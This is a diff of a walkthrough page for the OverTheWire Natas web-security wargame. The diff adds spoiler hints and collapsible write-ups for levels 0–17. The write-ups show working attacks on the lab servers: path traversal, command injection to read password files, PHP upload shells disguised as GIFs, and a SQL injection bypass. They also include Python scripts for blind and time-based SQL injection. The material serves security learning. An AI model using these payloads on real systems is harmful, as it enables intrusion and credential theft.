@@ -6,32 +6,81 @@ category: pages
 
 [overthewire / natas](http://www.overthewire.org/wargames/natas/)
 
+<a href="#" onclick="toggle_writeups();">Toggle writeups (hints will remain)</a>
+
 ## Level 0 ##
 
 View source
 
 ## Level 1 ##
 
+Hint 1: 
+<span class="spoiler" tabindex="0">
+Your right-click has been disabled. What other ways are there to view the source of a web page?
+</span>
+
+{::options parse_block_html="true" /}
+<div class="writeup">
 View source (but you can't use the right-click menu - use your browser's menu for that)
+</div>
 
 ## Level 2 ##
 
-The source reveals the source of an image as being `files/pixel.png`. We can list the contents of this [directory](http://natas2.natas.labs.overthewire.org/files), and users.txt contains the password for the next level.
+Hint 1:
+<span class="spoiler">
+How does the source for this page differ from the previous level's?
+</span>
+
+Hint 2:
+<span class="spoiler">
+Where is pixel.png sourced from?
+</span>
+
+Hint 3:
+<span class="spoiler">
+Can you list all the files in the files directory?
+</span>
+
+{::options parse_block_html="true" /}
+<div class="writeup">
+The source reveals the source of an image as being files/pixel.png. We can list the contents of this [directory](http://natas2.natas.labs.overthewire.org/files), and users.txt contains the password for the next level.
+</div>
 
 ## Level 3 ##
 
+Hint 1:
+<span class="spoiler">
+How do webmasters usually help search engines index their site?
+</span>
+
+Hint 2:
+<span class="spoiler">
+Have a look at the contents of robots.txt
+</span>
+
+{::options parse_block_html="true" /}
+<div class="writeup">
 That one is more interesting. The source gives us a hint by saying Google won't find it. Most sites have a file called [robots.txt](http://www.javascriptkit.com/howto/robots.shtml) - and sure enough [this](http://natas3.natas.labs.overthewire.org/robots.txt) gives us the name of another [directory](http://natas3.natas.labs.overthewire.org/s3cr3t/) containing another users.txt file.
+</div>
 
 ## Level 4 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 The landing page for this level tells us we are being referred from the wrong page (natas4 instead of natas5). But we do not have access to natas5 yet. What index.php is doing is checking the Referer tag in the headers. This can easily be tweaked by using the 'Modify Headers' addon for Firefox. Just set the 'Referer' tag to http://natas5.natas.labs.overthewire.org, start the addon and refresh the page. It will now give us the next password.
+</div>
 
 ## Level 5 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 The initial message is a bit cryptic. It seems we're not logged in, but looking at the source doesn't reveal anything. What about cookies? Sure enough the site stored a cookie with us. Using an addon such as 'Cookie Manager+', we see natas5 stored a cookie named 'loggedin' with content set to 0. Changing that to 1 and reload the page gets us in.
+</div>
 
 ## Level 6 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 The source (using the link on the page, not from the browser) yields this piece of code:
 
     include "includes/secret.inc";
@@ -40,13 +89,19 @@ The source (using the link on the page, not from the browser) yields this piece 
         if($secret == $_POST['secret']) {
 
 So we're looking for the value of $secret. By accessing the [include file](http://natas6.natas.labs.overthewire.org/includes/secret.inc) we get hold of that value. We insert it in the form and we're done.
+</div>
 
 ## Level 7 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 The hint in the page's source tells us the password is located in /etc/natas_webpass/natas8. We also see the index.php page takes an argument referencing a section (home, about), which could well be a path on the file system. And indeed referencing the [password file](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8) above gets us in.
+</div>
 
 ## Level 8 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 The source listing tells us how user input is transformed before being compared to the 'right' value. Reading the transformation function from inside out, input is first encoded in base64, then reversed (strrev) and then converted from binary to hexadecimal. So in order to reverse the encoded value we need to perform the reverse.
 
 1.  bin2hex converts an ASCII string into hexadecimal. 3d3d516343746d4d6d6c315669563362 -> ==QcCtmMml1ViV3b
@@ -54,17 +109,26 @@ The source listing tells us how user input is transformed before being compared 
 3.  and decoding it from base64: b3ViV1lmMmtCcQ== -> oubWYf2kBq
 
 Using this as the input secret gets us there.
+</div>
 
 ## Level 9 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 At first glance the code snippet allows us to look for a particular word (case insensitive) in a file called dictionary.txt. I first thought the password would be in the file somehow - and to display it all, grepping for new line (\n) does list the contents. However a quick glance through the file doesn't reveal anything interesting. But as we have free reign with the input, we can just as easily grep through anything else. In level 7 we were told some password files were located in /etc/natas_webpass. And by [crafting our input](http://natas9.natas.labs.overthewire.org/?needle=\n%20/etc/natas_webpass/natas10&submit=Search) (\n /etc/natas_webpass/natas10) we can get the script to display its contents.
+</div>
 
 ## Level 10 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 Very similar to the previous level. However this time characters like ';' and '&' are not allowed. Not a problem since we didn't use any. However the input we used previously doesn't seem to work. Maybe there are no new lines in this file. Instead we grab any letter (remember it's case insensitive) by using `[a-z] /etc/natas_webpass/natas11` and voila.
+</div>
 
 ## Level 11 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 The hint says cookies are 'protected' using XOR encryption.
 
     $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
@@ -89,28 +153,40 @@ For Step 2, we simply need to save the following by using `qw8J` instead of `<ce
     ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
 
 in the data section of the natas11 cookie. Refreshing the natas11 landing page shows the password
+</div>
 
 ## Level 12 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 This level is about seeing the forest from the trees. Viewing the source, there's a lot in there that's irrelevant. It's easy to get hung up on the random string generation (that's what I did). Taking a step back, we see that the only input we can control is just the extension (we can tamper with the POST data). However there doesn't seem to be much we can do with that - it's not passed to `eval` or anything. So how does this benefit us? 
 
 The answer lies in what extensions mean not to your browser, but to the web server. When I used to set mess around with Apache years back, I remember associating extensions to certain processors - like cgi, php, ...
 What we're provided with is essentially a way to store, and execute, code on the server. By crafting a simple file containing `<? system('cat /etc/natas_webpass/natas13') ?>` we can get the server to execute this for us, and show us what the password for the next level
+</div>
 
 ## Level 13 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 This is very similar to the previous level. However we see that before copying the file to `target`, the code uses `exif_imagetype` to validate the file is a picture. A quick look on the [php doc](http://www.php.net/manual/en/function.exif-imagetype.php) for this function tells us it only checks the header. So all we need to do is to make sure our file can mascarade as a picture. There are a variety of picture formats, but I picked GIF. A quick search reveals the required [header](http://www.matthewflickinger.com/lab/whatsinagif/bits_and_bytes.asp). A file with `GIF89a <? system('cat /etc/natas_webpass/natas14') ?>` does the trick.
+</div>
 
 ## Level 14 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 SQL injection at last! This is pretty straight forward. The sql being run is defined as:
 
     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
 
 User input is passed straight in. Putting `" or "1"="1` forces the statement to always be true and yields the required result.
+</div>
 
 ## Level 15 ##
 
+{::options parse_block_html="true" /}
+<div class="writeup">
 This level is slightly different. The only information we get from submitting the form can be boiled down to whether or not the sql query executed successfully. The source code does give us the schema of the users table, and we can use this to our advantage. Even though we can't get the snippet to show us the password, we can try each character in turn and validate our guess. It's clearly tedious to do that manually, but a little bit of python3 takes good care of the automation:
 
 {% highlight python %}
@@ -151,6 +227,57 @@ This level is slightly different. The only information we get from submitting th
     print('full password: %s' % password)
 {% endhighlight %}
 
-Note that `mysql` doesn't exactly have a `startswith` function, so we use `like binary "<guess>%"'.
+Note that `mysql` doesn't exactly have a `startswith` function, so we use `like binary "[guess]%"'.
+</div>
 
 ## Level 16 ##
+
+{::options parse_block_html="true" /}
+<div class="writeup">
+
+{% highlight python %}
+    def tryit(pw):
+      print('trying %s' % pw)
+      post_data = {'needle' : '^$(grep ^%s /etc/natas_webpass/natas17)African' % pw}
+      data = urllib.parse.urlencode(post_data)
+      binary_data = data.encode('ascii')
+      req = urllib.request.Request(url, binary_data)
+      response = urllib.request.urlopen(req)
+      the_page = response.read()
+      return r'<pre>\n</pre>' in str(the_page)
+{% endhighlight %}
+
+</div>
+
+## Level 17 ##
+
+Hint 1:
+<span class="spoiler">How else can you get a binary indicator? (ie, that the query succeeded or failed)
+</span>
+
+Hint 2:
+<span class="spoiler">This is called a Blind SQL injection</span>
+
+Hint 3:
+<span class="spoiler">Insert a statement that, if the previous leg of the and statement is true, will delay the response from coming back</span>
+
+{::options parse_block_html="true" /}
+<div class="writeup">
+
+Same as Level 15 - don't forget to `import timeit`.
+
+{% highlight python %}
+    def tryit(pw):
+      print('trying %s' % pw)
+      post_data = {'username' : 'natas18" and password like binary "%s%%" and sleep(4) and "1"="1' % pw}
+      data = urllib.parse.urlencode(post_data)
+      binary_data = data.encode('ascii')
+      req = urllib.request.Request(url, binary_data)
+      t_start = timeit.default_timer()
+      response = urllib.request.urlopen(req)
+      the_page = response.read()
+      t_end = timeit.default_timer()
+      return t_end - t_start > 3
+{% endhighlight %}
+
+</div>
